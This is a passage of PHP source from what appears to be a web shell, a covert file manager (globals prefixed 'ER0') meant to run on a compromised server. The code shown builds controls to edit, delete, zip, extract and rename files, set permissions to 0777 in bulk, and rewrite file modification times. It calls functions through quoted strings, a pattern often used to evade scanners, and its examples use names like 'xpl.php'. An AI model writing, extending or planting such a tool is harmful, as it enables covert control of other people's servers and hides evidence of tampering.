  * <span class="text-themecolor-300">{name}{C(ext)}</span> => Sxpl.pHp
  * <span class="text-themecolor-300">{type}_{C(name)}</span> => file_sXpL.php
  * <span class="text-themecolor-300">{type}_{name}{D(ext)}</span> => file_Sxpl
  * <span class="text-themecolor-300">{WD(S,name)}{ext}</span> => xpl.php
  * <span class="text-themecolor-300">{WR(Sxpl>Sxpl4646,name)}{ext}</span> => Sxpl4646.php

<span class="text-themecolor-300">Default Behavior:</span>
  * If passing plaintext, this rule applied by default:
  * [counter if items more than one] [extension if items is file or if format "ext" not set]
  * example: newname => newfolder or 01_newfile.txt</div>
                        </div>
                        </details>
                    </div>
                    ';
                    $action = 'bulk_rename';
                    break;

                case 'bulk_zip':
                    $valElement = '<input type="text" id="value" value="' . $dir . __DIRECTORY_SEPARATOR__ . rand(10000, 99999) . '.zip"  class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Destination | path/to/file/file.zip">';
                    $label = 'Zip Destination';
                    $action = 'bulk_zip';
                    break;

                case 'bulk_chmod':
                    $valElement = '<input type="number" id="value" value="0777"  class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="New Permission">';
                    $label = 'New Permission';
                    $action = 'bulk_chmod';
                    break;

                case 'bulk_time':
                    $format_ = $GLOBALS['ER0_config']['timeformat'] == 24 ? 'H' : 'h';
                    $valElement = '<input type="datetime-local" id="value" value="' . date("Y-m-d " . $format_ . ":m") . '"  class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Datetime">';
                    $label = 'Last Modified';
                    $action = 'bulk_time';
                    break;

                case 'bulk_delete':
                    $action = 'bulk_delete';
                    $del = true;
                    break;


                default:
                    # code...
                    break;
            }

            $detailv = json_decode(Utils::__charcode_dec(Utils::__string_dec($value)), true);
            $detail = '';
            $counts = 1;
            // Check if decoding was successful
            if (json_last_error() === JSON_ERROR_NONE) {
                // Iterate over each element in the array
                foreach ($detailv as $d1) {
                    // Check if 'item' is 'dir' or 'file'
                    $types_ = '';
                    if ($d1['item'] == 'dir') {
                        // Decode the 'dir' hex string and get the basename
                        $types_ = '[DIR]';
                    } else {
                        $types_ = '[FILE]';
                    }
                    $detail .= '
                    <tr>
                        <td class="w-8">' . $counts . '</td>
                        <td class="w-12">' . $types_ . '</td>
                        <td>' . Utils::__string_dec($d1['file']) . '</td>
                    </tr>
                    ';
                    $counts++;
                }
            } else {
                // Print the error message
                $detail .= 'JSON decoding error: ' . json_last_error_msg();
            }


            if ($del) {
                $content = '
                <div class="text-center">
                <input type="hidden" id="' . $action . '" disabled value="' . $action . '">
                <input type="hidden" id="bulk" disabled value="' . $value . '">
                <input type="hidden" id="confirm" disabled value="DELETES">

                    <label class="block mb-4 text-sm font-medium text-foreground">This will permanently delete all folder and files!</label>

                    <div class="w-full flex items-center justify-center gap-2">
                        <a onclick="S(`' . Utils::__charcode_enc('{"0": "'.$action.'", "1": "bulk", "2": "confirm"}') . '`)" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-red hover:brightness-75 p-2.5 border border-themecolor-red">Delete</a>
                        <a onclick="$(`#tools_container`).addClass(`hidden`); $(`#filemanager`).removeClass(`hidden`);" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-themecolor-400 bg-themecolor-700 hover:text-foreground p-2.5 border border-themecolor-600">Cancel</a>
                    </div>
                </div>

                <div class="gap-2 text-left">
                    <div class="h-auto flex-1">
                        <details class="group [&_summary::-webkit-details-marker]:hidden my-4" open>
                            <summary class="flex cursor-pointer items-center mb-2 justify-start gap-1.5 rounded-lg text-foreground" >
                            <h2 class="font-medium text-sm">Detail</h2>
                            <svg
                                class="w-3 h-3 shrink-0 transition duration-300 group-open:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6" stroke="currentColor">
                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5 5 1 1 5"></path>
                            </svg>
                            </summary>
                            <div class="h-auto flex-1 p-2 overflow-auto max-h-[75vh] rounded-lg border bg-themecolor-700 border-themecolor-600">
                            <table class="table-auto text-sm w-full text-themecolor-400">
                            ' . $detail . '
                            </table>
                            </div>
                        </details>
                    </div>
                </div>
                        ';
            } else {
                $inputElement = '
                        <div class="md:flex gap-2 mb-4">
                            <input type="hidden" id="' . $action . '" disabled value="' . $action . '">
                            <input type="hidden" id="bulk" disabled value="' . $value . '">
                            <div class="w-full">
                                <label for="bulk" class="block mb-2 text-sm font-medium text-foreground">Source Items</label>
                                <input type="text" id="bulk" disabled value="[ ' . $file . ' ]" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Name ...">
                            </div>
                            <div class="w-full mt-4 md:mt-0">
                                <label for="value" class="block mb-2 text-sm font-medium text-foreground">' . $label . '</label>
                                <div class="flex gap-2">
                                ' . $valElement . '
                                    #EXEC#

                                </div>
                            </div>
                        </div>
                        ' . $renamePrefix . '
                        <div class="gap-2 text-left">
                            <div class="h-auto flex-1">
                                <details class="group [&_summary::-webkit-details-marker]:hidden my-4" open>
                                    <summary class="flex cursor-pointer items-center mb-2 justify-start gap-1.5 rounded-lg text-foreground" >
                                    <h2 class="font-medium text-sm">Detail</h2>

                                    <svg
                                        class="w-3 h-3 shrink-0 transition duration-300 group-open:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6" stroke="currentColor">
                                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5 5 1 1 5"></path>
                                    </svg>
                                    </summary>
                                    <div class="h-auto flex-1 p-2 overflow-auto max-h-[75vh] rounded-lg border bg-themecolor-700 border-themecolor-600">
                                    <table class="table-auto text-sm w-full text-themecolor-400">
                                    ' . $detail . '
                                    </table>

                                    </div>
                                </details>
                            </div>
                        </div>
                        ';


                $content = Frontend::__generate_tools_container($action, Utils::__string_enc($dir), 'bulk', '', $inputElement, 'value', '', '', false);
            }
        } else if (str_contains($opt, 'save')) {
            switch ($opt) {
                case 'save_zip':
                    $content = Filesman::__zip($file, $value);
                    break;

                case 'save_extract':
                    $content = Filesman::__extract($file, $value);
                    break;

                case 'save_edit':
                    $content = Filesman::__edit($file, $value);
                    break;

                case 'save_rename':
                    $content = Filesman::__rename($file, $value);
                    break;

                case 'save_copy':
                case 'save_move':
                    $content = Filesman::__move_copy($file, $value, $opt);
                    break;

                case 'save_chmod':
                    $content = Filesman::__chmod($file, $value);
                    break;

                case 'save_time':
                    $content = Filesman::__time($file, $value);
                    break;

                case 'save_delete':
                    $content = Filesman::__delete($file, $value);
                    break;

                default:
                    # code...
                    break;
            }
        } else if ($opt == 'tools') {
            switch ($value) {
                case 'create_file':
                    $dst =  ($GLOBALS['ER0_config']['show_fullpath'] ? $dir : basename($dir)) . __DIRECTORY_SEPARATOR__ . (!empty($file) ? $file : 'newfile.txt');

                    $inputElement = '
                    <input type="text" id="filename" value="' . $dst . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Name ... | replace:filename">
                    ';

                    $textareaElement = '
                    <div class="editorContainer relative block h-[75vh] sm:h-[77vh] overflow-hidden border border-themecolor-600 w-full rounded-lg setFonts" style="font-size:12pt !important; line-height: 150%;">
                        <pre class="w-full h-full absolute t-0 l-0 overflow-hidden p-0 m-0 bg-[#1b1b1b]"><code id="codeBlock" class="language-plaintext setFonts hljs overflow-x-auto overflow-y-scroll h-full w-full"></code></pre>
                        <textarea id="content"  spellcheck="false" class="p-[1em] z-2 t-0 l-0 bg-transparent text-transparent absolute overflow-x-scroll overflow-y-scroll h-full w-full focus:ring-primary focus:border-primary" style="caret-color:white;"></textarea>
                    </div>
                    <script>

                    editorSet(`content`,`codeBlock`);
                    setTimeout(updateCode(`content`,`codeBlock`), 500);

                    </script>';

                    $content = Frontend::__generate_tools_container($GLOBALS['ER0_string']['filesman'], Utils::__string_enc($dir), 'filename', 'File Name', $inputElement, 'content', 'File Content', $textareaElement, true, $value);
                    break;

                case 'create_folder':
                    $dst =  ($GLOBALS['ER0_config']['show_fullpath'] ? $dir : basename($dir)) . __DIRECTORY_SEPARATOR__ . (!empty($file) ? $file : 'newfolder');

                    $inputElement = '
                    <div class="md:flex gap-2">
                        <div class="w-full">
                            <label for="dirname" class="block mb-2 text-sm font-medium text-foreground">Folder Name</label>
                            <input type="text" id="dirname" value="' . $dst . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Folder Name">
                        </div>
                        <div class="w-full mt-4 md:mt-0">
                            <label for="perm" class="block mb-2 text-sm font-medium text-foreground">Folder Permission</label>
                            <div class="flex gap-2">
                                <input type="number" id="perm" value="0777" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Folder Permission">
                                #EXEC#

                            </div>
                        </div>
                    </div>';

                    $content = Frontend::__generate_tools_container($GLOBALS['ER0_string']['filesman'], Utils::__string_enc($dir), 'dirname', '', $inputElement, 'perm', '', '', false);
                    break;

                default:
                    # code...
                    break;
            }
        } else {
            switch ($opt) {
                case 'open':
                    $ext = pathinfo($file, PATHINFO_EXTENSION);
                    $iszip = (in_array($ext, $GLOBALS['ER0_array']['arc_ext']) ? true : false);
                    $isimg = (in_array($ext, $GLOBALS['ER0_array']['img_ext']) ? true : false);
                    $isvid = (in_array($ext, $GLOBALS['ER0_array']['vid_ext']) ? true : false);
                    $isaud = (in_array($ext, $GLOBALS['ER0_array']['aud_ext']) ? true : false);
                    $counts_ = 1;
                    $detail_ = '';

                    if (!$iszip) {
                        if ("filemtime"($file)) {
                            $text = "htmlentities"(Filesman::__read_file($file));
                        } else {
                            $text = "Failed to get file last modification time!";
                        }
                    } else {
                        $zip = new ZipArchive;

                        if ($zip->open($file) === TRUE) {
                            for ($i = 0; $i < $zip->numFiles; $i++) {
                                $fileNames = $zip->getNameIndex($i);
                                $detail_ .= '
                                <tr>
                                    <td class="w-8">' . $counts_ . '</td>
                                    <td class="w-14 pr-2"><span class="truncate w-14">' . (empty(pathinfo($fileNames, PATHINFO_EXTENSION)) ? 'DIR' : pathinfo($fileNames, PATHINFO_EXTENSION)) . '</span></td>
                                    <td>' . (dirname($fileNames) == '.' ? '<span class="text-themecolor-300">' . basename($fileNames) . '</span>' : str_replace(__DIRECTORY_SEPARATOR__, '<span class="text-themecolor-500 font-normal"> > </span>', dirname($fileNames)) . '<span class="text-themecolor-500 font-normal"> > </span><span class="text-themecolor-300">' . basename($fileNames) . '</span>') . '</td>
                                </tr>
                                ';
                                $counts_++;
                            }
                            $zip->close();
                        } else {
                            try {
                                $tar = new PharData($file);

                                foreach (new RecursiveIteratorIterator($tar) as $file_) {
                                    $fileNames = $file_->getFilename();
                                    $detail_ .= '
                                    <tr>
                                        <td class="w-8">' . $counts_ . '</td>
                                        <td class="w-14 pr-2"><span class="truncate w-14">' . (empty(pathinfo($fileNames, PATHINFO_EXTENSION)) ? 'DIR' : pathinfo($fileNames, PATHINFO_EXTENSION)) . '</span></td>
                                        <td>' . (dirname($fileNames) == '.' ? '<span class="text-themecolor-300">' . basename($fileNames) . '</span>' : str_replace(__DIRECTORY_SEPARATOR__, '<span class="text-themecolor-500 font-normal"> > </span>', dirname($fileNames)) . '<span class="text-themecolor-500 font-normal"> > </span><span class="text-themecolor-300">' . basename($fileNames) . '</span>') . '</td>
                                    </tr>
                                    ';
                                    $counts_++;
                                }
                            } catch (Exception $e) {
                                $detail_ .= '
                                <tr>
                                    <td>Error, cannot open file archive</td>
                                </tr>
                                ';
                            }
                        }
                    }

                    $EDITORTHEME = '';
                    $EDITORFONT = '';
                    $EDITORENABLE = false;

                    foreach ($GLOBALS['ER0_array']['editor_theme'] as $theme) {
                        $EDITORTHEME .= "<option value='$theme'>$theme</option>";
                    }

                    foreach ($GLOBALS['ER0_array']['editor_font'] as $font) {
                        $EDITORFONT .= "<option value='$font'>$font</option>";
                    }

                    $textFiletype = '<div class="md:flex gap-2 mb-4 mt-4">

                    <select id="editor_theme" onchange="wrapWord = false; if(document.getElementById(`editor_wrap`).checked){ wrapWord = true; } saveEditorConfig(`editor_theme`,`editor_font`,`editor_font_size`, wrapWord)" class="p-2.5 bg-themecolor-700 w-full border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block">
                    ' . $EDITORTHEME . '
                    </select>

                    <div class="flex gap-2 mt-2 md:mt-0">
                    <select id="editor_font" onchange="wrapWord = false; if(document.getElementById(`editor_wrap`).checked){ wrapWord = true; } saveEditorConfig(`editor_theme`,`editor_font`,`editor_font_size`, wrapWord)" class="p-2.5 bg-themecolor-700 w-full md:w-auto border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block">
                    ' . $EDITORFONT . '
                    </select>

                    <input type="number" id="editor_font_size" onchange="wrapWord = false; if(document.getElementById(`editor_wrap`).checked){ wrapWord = true; } saveEditorConfig(`editor_theme`,`editor_font`,`editor_font_size`, wrapWord)" step=".5" value="12" class="border text-sm rounded-lg block w-16 p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary">

                    <div class="w-auto flex items-center gap-2 border rounded-lg block bg-themecolor-700 border-themecolor-600 text-foreground">
                        <input id="editor_wrap" value="true" onchange="wrapWord = false; if(this.checked){ wrapWord = true; } saveEditorConfig(`editor_theme`,`editor_font`,`editor_font_size`, wrapWord)" type="checkbox" class="check-item m-2.5 mr-0 w-4 h-4 accent-[#f283b6] text-[#f283b6] rounded focus:ring-[#f283b6] ring-offset-themecolor-800 focus:ring-offset-themecolor-800 focus:ring-2 bg-themecolor-700 border-themecolor-600">
                        <label for="editor_wrap" class="block text-sm font-medium text-foreground p-2.5 pl-0">Wrap</label>
                    </div>
                    </div>

                    </div>

                    <script>
                    if(localStorage.getItem("ER0_editorConfig") != null){
                        dataset = JSON.parse(localStorage.getItem("ER0_editorConfig"));
                        $(`#editor_theme`).val(dataset.theme);
                        $(`#editor_font`).val(dataset.font);
                        $(`#editor_font_size`).val(dataset.size);

                        document.getElementById(`editor_wrap`).checked = dataset.wrap;
                    }
                    </script>
                    ';

                    $unzip = ($iszip ? "<option value='" . Utils::__string_enc('extract') . "' class='text-left'>Extract</option>" : '<option value="' . Utils::__string_enc('edit') . '" class="text-left">Edit</option>');
                    $src =  $GLOBALS['ER0_config']['show_fullpath'] ? dirname(realpath($file)) . __DIRECTORY_SEPARATOR__ . $file : $file;

                    $filename = ($iszip ? '<div class="flex gap-2">' : '') . '
                    <input type="text" disabled value="' . $src . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Name ...">
                    <select id="action-' . md5($file) . '" class="p-2.5 bg-themecolor-700 w-auto border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block" >
                        ' . $unzip . '
                        <option value="' . Utils::__string_enc('rename') . '" class="text-left">Rename</option>
                        <option value="' . Utils::__string_enc('copy') . '" class="text-left">Copy</option>
                        <option value="' . Utils::__string_enc('move') . '" class="text-left">Move</option>
                        <option value="' . Utils::__string_enc('link') . '" class="text-left">Direct Link</option>
                        <option value="' . Utils::__string_enc('raw') . '" class="text-left">View Raw</option>
                        <option value="' . Utils::__string_enc('download') . '" class="text-left">Download</option>
                        <option value="' . Utils::__string_enc('chmod') . '" class="text-left">Chmod</option>
                        <option value="' . Utils::__string_enc('time') . '" class="text-left">Edit Time</option>
                        <option value="' . Utils::__string_enc('delete') . '" class="text-left">Delete</option>
                    </select>
                    <a onclick="$(this).attr(`href`, `#action=' . $GLOBALS['ER0_string']['filesman'] . '&dir=' . Utils::__string_enc($dir) . '&file=' . Utils::__string_enc($file) . '&opt=`+$(`#action-' . md5($file) . '`).val());" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">>></a>
                    ' . ($iszip ? '</div>
                    <div class="gap-2 text-left">
                            <div class="h-auto flex-1">
                                <details class="group [&_summary::-webkit-details-marker]:hidden my-4" open>
                                    <summary class="flex cursor-pointer items-center mb-2 justify-start gap-1.5 rounded-lg text-foreground" >
                                    <h2 class="font-medium text-sm">Contents</h2>

                                    <svg
                                        class="w-3 h-3 shrink-0 transition duration-300 group-open:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6" stroke="currentColor">
                                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5 5 1 1 5"></path>
                                    </svg>
                                    </summary>
                                    <div class="h-auto flex-1 p-2 overflow-auto max-h-[75vh] rounded-lg border bg-themecolor-700 border-themecolor-600">
                                    <table class="table-auto text-sm w-full text-themecolor-400">
                                    ' . $detail_ . '
                                    </table>

                                    </div>
                                </details>
                            </div>
                    </div>

                    ' : '');

                    $labels = '<label for="content" class="block mb-2 text-sm font-medium text-foreground">File Content</label>';

                    if ($iszip) {
                        $filecontent = 'not_use';
                    } else {
                        if ($isimg) {
                            $labels = '';
                            $filecontent = '<img class="h-auto w-2/4 rounded-lg mx-auto" src="' . __SCRIPT__ . '?content=' . Utils::__string_enc(realpath($file)) . '" alt="' . $file . '">';
                        } else if ($isvid) {
                            $labels = '';
                            $filecontent = '<video class="w-screen sm:w-full h-auto max-w-full border rounded-lg border-themecolor-600" controls loop src="' . __SCRIPT__ . '?content=' . Utils::__string_enc(realpath($file)) . '" alt="' . $file . '" type="' . Filesman::__get_filetype($file) . '"></video>';
                        } else if ($isaud) {
                            $labels = '';
                            $filecontent = '<audio class="w-screen sm:w-full max-w-full filterBlue" controls loop src="' . __SCRIPT__ . '?content=' . Utils::__string_enc(realpath($file)) . '" alt="' . $file . '" type="' . Filesman::__get_filetype($file) . '"></audio>';
                        } else {
                            $EDITORENABLE = true;
                            $filecontent = '
                            <div class="editorContainer relative block h-[75vh] sm:h-[77vh] overflow-hidden border border-themecolor-600 w-full rounded-lg setFonts" style="font-size:12pt !important; line-height: 150%;">
                                <pre class="w-full h-full absolute t-0 l-0 overflow-hidden p-0 m-0 bg-[#1b1b1b]"><code id="codeBlock" class=" setFonts hljs overflow-x-auto overflow-y-scroll h-full w-full"></code></pre>
                                <textarea disabled id="content"  spellcheck="false" class="p-[1em] z-2 t-0 l-0 bg-transparent text-transparent absolute overflow-x-scroll overflow-y-scroll h-full w-full focus:ring-primary focus:border-primary" style=" caret-color:white;">' . $text . '</textarea>
                            </div>
                            <script>

                            editorSet(`content`,`codeBlock`);
                            setTimeout(updateCode(`content`,`codeBlock`), 500);

                            </script>';
                        }
                    }

                    if ($filecontent == 'not_use') {
                        $content = '
                        <div class="gap-2 text-left">
                            <div class="mb-4">
                                ' . $filename . '
                            </div>
                        </div>';
                    } else {
                        $content = '
                        <div class="gap-2 text-left">
                            ' . ($EDITORENABLE ? $textFiletype : '') . '
                            <div class="mb-4">
                                <label for="filename" class="block mb-2 text-sm font-medium text-foreground">File Name</label>
                                <div class="flex gap-2">
                                ' . $filename . '
                                </div>
                            </div>
                            <div class="h-full flex-1">
                                ' . $labels . $filecontent . '
                            </div>
                        </div>';
                    }

                    break;



                case 'zip':
                    $dest =  $GLOBALS['ER0_config']['show_fullpath'] ? dirname(realpath($file)) . __DIRECTORY_SEPARATOR__ . $file : $file;

                    $inputElement = '
                    <div class="md:flex gap-2">
                        <div class="w-full">
                            <label for="dirname" class="block mb-2 text-sm font-medium text-foreground">Folder Source</label>
                            <input type="text" id="dirname" disabled value="' . $file . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Path Source">
                        </div>
                        <div class="w-full mt-4 md:mt-0">
                            <label for="destination" class="block mb-2 text-sm font-medium text-foreground">Zip Destination</label>
                            <div class="flex gap-2">
                                <input type="text" id="destination" value="' . $dest . '_' . rand(10000, 99999) . '.zip" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Zip Destination | path/to/zip/file.zip">
                                #EXEC#

                            </div>
                        </div>
                    </div>';

                    $content = Frontend::__generate_tools_container($GLOBALS['ER0_string']['filesman'], Utils::__string_enc($dir), 'dirname', '', $inputElement, 'destination', '', '', false);
                    break;

                case 'extract':
                    $pathInfo = pathinfo($file);
                    $dest =  $GLOBALS['ER0_config']['show_fullpath'] ? dirname(realpath($file)) . __DIRECTORY_SEPARATOR__ . $pathInfo['filename'] : $pathInfo['filename'];

                    $inputElement = '
                    <div class="md:flex gap-2">
                        <div class="w-full">
                            <label for="filename" class="block mb-2 text-sm font-medium text-foreground">Archive Name</label>
                            <input type="text" id="filename" disabled value="' . $file . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Name ...">
                        </div>
                        <div class="w-full mt-4 md:mt-0">
                            <label for="destination" class="block mb-2 text-sm font-medium text-foreground">Extract Destination</label>
                            <div class="flex gap-2">
                                <input type="text" id="destination" value="' . $dest . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Extract Destination | path/to/dest/folder">
                                #EXEC#

                            </div>
                        </div>
                    </div>';

                    $content = Frontend::__generate_tools_container($GLOBALS['ER0_string']['filesman'], Utils::__string_enc($dir), 'filename', '', $inputElement, 'destination', '', '', false);
                    break;

                case 'edit':
                    if ("is_writable"($file)) {
                        $text = "htmlentities"(Filesman::__read_file($file));
                    } else {
                        $text = "File is not writable!";
                    }

                    $inputElement = '
                    <input type="text" id="filename" disabled value="' . $file . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Name ...">
                    ';

                    $textareaElement = '
                    <div class="editorContainer relative block h-[75vh] sm:h-[77vh] overflow-hidden border border-themecolor-600 w-full rounded-lg setFonts" style="font-size:12pt !important;">
                        <pre class="w-full h-full absolute t-0 l-0 overflow-hidden p-0 m-0 bg-[#1b1b1b]"><code id="codeBlock" class="setFonts hljs overflow-x-auto overflow-y-scroll h-full w-full" style="line-height: 150%;"></code></pre>
                        <textarea id="content"  spellcheck="false" class="p-[.95em] z-2 t-0 l-0 bg-transparent text-transparent absolute overflow-x-scroll overflow-y-scroll h-full w-full focus:ring-primary focus:border-primary" style="line-height: 150%; caret-color:white;">' . $text . '</textarea>
                    </div>
                    <script>

                    editorSet(`content`,`codeBlock`);
                    setTimeout(updateCode(`content`,`codeBlock`), 500);

                    </script>
                    ';

                    $content = Frontend::__generate_tools_container($GLOBALS['ER0_string']['filesman'], Utils::__string_enc($dir), 'filename', 'File Name', $inputElement, 'content', 'File Content', $textareaElement, true, $opt);
                    break;

                case 'rename':

                    $inputElement = '
                    <div class="md:flex gap-2">
                        <div class="w-full">
                            <label for="oldname" class="block mb-2 text-sm font-medium text-foreground">Old Name</label>
                        <input type="text" id="oldname" disabled value="' . $file . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Name ...">
                        </div>
                        <div class="w-full mt-4 md:mt-0">
                            <label for="destination" class="block mb-2 text-sm font-medium text-foreground">New Name</label>
                            <div class="flex gap-2">
                            <input type="text" id="newname" value="' . $file . '"  class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="New Name ...">
                                #EXEC#

                            </div>
                        </div>
                    </div>';

                    $content = Frontend::__generate_tools_container($GLOBALS['ER0_string']['filesman'], Utils::__string_enc($dir), 'oldname', '', $inputElement, 'newname', '', '', false);
                    break;

                case 'copy':
                case 'move':
                    $inputElement = '
                    <div class="md:flex gap-2">
                        <div class="w-full">
                            <label for="filesource" class="block mb-2 text-sm font-medium text-foreground">' . (is_dir($file) ? 'Folder' : 'File') . ' Name</label>
                            <input type="text" id="filesource" disabled value="' . $file . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Name ...">
                        </div>
                        <div class="w-full mt-4 md:mt-0">
                            <label for="destination" class="block mb-2 text-sm font-medium text-foreground">Destination</label>
                            <div class="flex gap-2">
                            <input type="text" id="destination" value="' . dirname(realpath($file)) . '"  class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Destination | path/to/file">
                                #EXEC#

                            </div>
                        </div>
                    </div>';

                    $content = Frontend::__generate_tools_container($GLOBALS['ER0_string']['filesman'], Utils::__string_enc($dir), 'filesource', '', $inputElement, 'destination', '', '', false);
                    break;

                case 'chmod':
                    $inputElement = '
                    <div class="md:flex gap-2">
                        <div class="w-full">
                            <label for="filesource" class="block mb-2 text-sm font-medium text-foreground">' . (is_dir($file) ? 'Folder' : 'File') . ' Name</label>
                            <input type="text" id="filename" disabled value="' . $file . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Name & Perm">
                        </div>
                        <div class="w-full mt-4 md:mt-0">
                            <label for="destination" class="block mb-2 text-sm font-medium text-foreground">New Permission</label>
                            <div class="flex gap-2">
                            <input type="number" value="' . Filesman::__get_permission($file, 'num') . '" id="newperm" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="New Perm ...">
                                #EXEC#

                            </div>
                        </div>
                    </div>';

                    $content = Frontend::__generate_tools_container($GLOBALS['ER0_string']['filesman'], Utils::__string_enc($dir), 'filename', '', $inputElement, 'newperm', '', '', false);
                    break;

                case 'time':
                    if ("filemtime"($file)) {
                        $format_ = $GLOBALS['ER0_config']['timeformat'] == 24 ? 'H' : 'h';
                        $date = date("Y-m-d " . $format_ . ":m", "filemtime"($file));
                    } else {
                        $date = "";
                    }

                    $inputElement = '
                    <div class="md:flex gap-2">
                        <div class="w-full">
                            <label for="filesource" class="block mb-2 text-sm font-medium text-foreground">' . (is_dir($file) ? 'Folder' : 'File') . ' Name</label>
                            <input type="text" id="filename" disabled value="' . $file . '" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Name ...">
                        </div>
                        <div class="w-full mt-4 md:mt-0">
                            <label for="newdate" class="block mb-2 text-sm font-medium text-foreground">Last Modified</label>
                            <div class="flex gap-2">
                            <input type="datetime-local" value="' . $date . '" id="newdate" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary">
                                #EXEC#

                            </div>
                        </div>
                    </div>';

                    $content = Frontend::__generate_tools_container($GLOBALS['ER0_string']['filesman'], Utils::__string_enc($dir), 'filename', '', $inputElement, 'newdate', '', '', false);
                    break;

                case 'delete':

                    $inputElement = '
                    <div class="text-center">
                        <input type="hidden" id="filename" disabled value="' . $file . '" class="hidden border text-sm rounded-lg w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary">
                        <input type="hidden" value="' . (is_dir($file) ? md5($file) : md5_file($file)) . '" id="confirm" disabled class="hidden border text-sm rounded-lg w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary">
                        <label class="block mb-4 text-sm font-medium text-foreground">' . (is_dir($file) ? "This will permanently delete the folder and all files in it!" : "This will delete the files permanently!") . '</label>

                        <div class="w-full flex items-center justify-center gap-2">

                            <a onclick="S(`' . Utils::__charcode_enc('{"0": "filename", "1": "confirm"}') . '`)" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-red hover:brightness-75 p-2.5 border border-themecolor-red">Delete</a>
                            <a href="#action=' . $GLOBALS['ER0_string']['filesman'] . '&dir=' . Utils::__string_enc($dir) . '" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-themecolor-400 bg-themecolor-700 hover:text-foreground p-2.5 border border-themecolor-600">Cancel</a>
                        </div>
                    </div>';

                    $content = Frontend::__generate_tools_container($GLOBALS['ER0_string']['filesman'], Utils::__string_enc($dir), 'filename', '', $inputElement, 'confirm', '', '', false);
                    break;

                default:
                    # code...
                    break;
            }
        }

        return $content;
    }

    /**
     * Print the Directory list
     * @param string $path
     */
    public static function __get_dirlist($path)
    {
        // Initialize the content variable
        $PARENT_PATH = dirname($path);

        $content = '
